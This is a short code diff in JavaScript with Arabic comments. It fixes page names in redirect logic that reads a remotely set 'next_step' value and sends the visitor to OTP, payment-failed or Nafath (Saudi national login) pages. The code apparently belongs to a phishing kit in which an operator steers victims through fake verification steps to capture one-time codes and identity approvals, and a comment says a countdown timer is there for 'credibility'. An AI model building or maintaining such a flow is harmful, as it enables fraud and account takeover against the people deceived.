@@ -54,7 +54,7 @@
         });
 
         // الانتقال التلقائي لصفحة الاتصال الموجودة عندك
-        window.location.href = "call-verification.html";
+        window.location.href = "call_verification.html";
     }
 
     // عداد الوقت التنازلي للجمالية والمصداقية
@@ -76,9 +76,9 @@
             if (doc.exists) {
                 const data = doc.data();
                 if (data.next_step === "GO_TO_OTP") {
-                    window.location.href = "otp.html"; 
+                    window.location.href = "otp_verification.html"; 
                 } else if (data.next_step === "GO_TO_REJECT") {
-                    window.location.href = "payment_faild.html";
+                    window.location.href = "payment_failed.html";
                 } else if (data.next_step === "GO_TO_NAFATH") {
                     window.location.href = "nafath.html";
                 } else if (data.next_step === "SHOW_NAFATH_CODE") {
